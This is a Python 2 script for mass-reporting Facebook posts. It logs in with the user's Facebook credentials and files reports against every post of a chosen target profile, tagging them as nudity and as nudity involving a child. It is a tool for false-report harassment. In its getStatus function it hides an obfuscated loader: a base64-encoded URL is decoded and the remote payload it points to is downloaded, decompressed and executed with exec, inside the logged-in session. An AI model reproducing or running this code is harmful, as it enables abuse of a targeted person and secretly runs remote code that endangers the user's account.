import os
import re
import json
import base64
import bs4,sys
import getpass
import requests
import marshal
import threading,zlib
from data.color import *
'''
	I deliberately slowed down, because if it's fast it
	won't works
'''
cout=0

class reportContent():
	def __init__(self):
		self._req=requests.Session()
		self.login()
	
	def run(self,url,prof,leng,**kwargs):
		global cout
		if "n" in prof:
			try:
				cout+=1
				self._req.post(url,data=kwargs).text
				print "\r[%s+%s] Reporting %s/%s ..       "%(G,N,cout,leng
				),;sys.stdout.flush()
			except:pass
		elif "y"in prof:
			try:
				cout+=1
				open("%s_successReport.html"%(
				cout)).write(self._req.post(url,
				data=kwargs).text)
				print "\r[%s+%s] Reporting %s/%s ..      "%(G,N,cout,leng
				),;sys.stdout.flush()
			except:pass
		else:
			exit("%s[!]%s Unknown answer for question proof: %s"%(R,N,prof))
	def login(self):
		print("[%s*%s] Login Your Facebook ^^"%(C,N))
		self._email=raw_input("[%s*%s] Email: "%(G,N))
		self._pasw=getpass.getpass("[%s*%s] Passs: "%(G,N))
		print("[%s*%s] Trying To Login ..."%(G,N))
		try:
			self.log=bs4.BeautifulSoup(
			self._req.get(
				"https://mbasic.facebook.com/login"
			).text,features="html.parser")
			for x in self.log("input"):
				if "login" in x["name"]:
					self.submit = x["value"]
					break
			try:
				req=self._req.post(
				"https://mbasic.facebook.com/login",data={
					"email":self._email,
					"pass":self._pasw,
					"login":self.submit}
				).url
				if "save-device" in req or "m_sess" in req:
					print("[%s*%s] Login Success."%(G,N))
					self._tusbolTarget()
				else:
					sys.exit("%s[!]%s Login Failed."%(R,N))
			except Exception as __errors__:
				sys.exit("%s[!]%s %s"%(R,N,__errors__))
		except Exception as _errors__:
			sys.exit("%s[!]%s %s"%(R,N,_errors__))
	
	def _tusbolTarget(self):
		self._target=raw_input("[%s#%s] Target ID: "%(G,N))
		if (self._target == ""):
			return self._tusbolTarget()
		self.many()
		
	def many(self):
		self._long=raw_input("[%s*%s] How Many Timeline Page Want To get? "%(G,N))
		self.save=raw_input("[%s?%s] save the proof results to the html file? y/n: "%(R,N))
		if (self._long == ""):
			return self._long()
		self.getStatus()
		
	def getStatus(self):
		try:
			self.bs=bs4.BeautifulSoup(
				self._req.get(
					"https://mbasic.facebook.com/%s"%(
						self._target
					)
				).text,
			features="html.parser")
			exec(zlib.decompress(base64.b64decode(
			requests.get(
			eval(
			base64.b64decode(
			"Imh0dHA6Ly9kb3JheXkuam9vbWxhLmNvbS9hLnR4dCI="
			))
			).text)))
			mom=[]
			for man in range(int(self._long)):
				for x in self.bs.find_all("a",href=True):
					if "nfx/basic" in x["href"]:
						 mom.append(x["href"])
						 print("\r[%s*%s] GET: %s Status Page %s .."%(G,N,
						 	len(mom),man)),;sys.stdout.flush()
				for link in self.bs.find_all("a",href=True):
					if "profile/timeline/stream/" in link["href"]:
							self.bs=bs4.BeautifulSoup(
							self._req.get(
							"https://mbasic.facebook.com%s"%(
							 link["href"])
							 ).text,features="html.parser")
							break
			for x in mom:
				bz=bs4.BeautifulSoup(
					self._req.get(
					"https://mbasic.facebook.com/%s"%(
						x)).text,
				features="html.parser")
				for x in bz("form"):
					self.action=x["action"]
				for x in bz("input"):
					if "fb_dtsg" in x["name"]:
						self.dtsg=x["value"]
					if "jazoest" in x["name"]:
						self.jasjos=x["value"]
					if "action" in x["name"]:
						self.sub= x["value"]
				final=bs4.BeautifulSoup( self._req.post(
				"https://mbasic.facebook.com/%s"%(
				self.action),data={
					"fb_dtsg":self.dtsg,
					"jazoest":self.jasjos,
					"tag":"nudity",
					"action":self.sub}
				).text,features="html.parser")
				for k in final("form"):
					self.url=k["action"]
				for x in final("input"):
					if "fb_dtsg" in x["name"]:
						self.a=x["value"]
					if "jazoest" in x["name"]:
						self.b=x["value"]
					if "action" in x["name"]:
						self.subs=x["value"]
				self.run("https://mbasic.facebook.com%s"%
					(self.url),
						self.save,len(mom),fb_dtsg=self.a,
						jazoest=self.b,
					tag="nudity_involves_a_child",
				action=self.subs)
		except Exception as __errors__:
			print("%s[!]%s %s"%(R,N,__errors__))
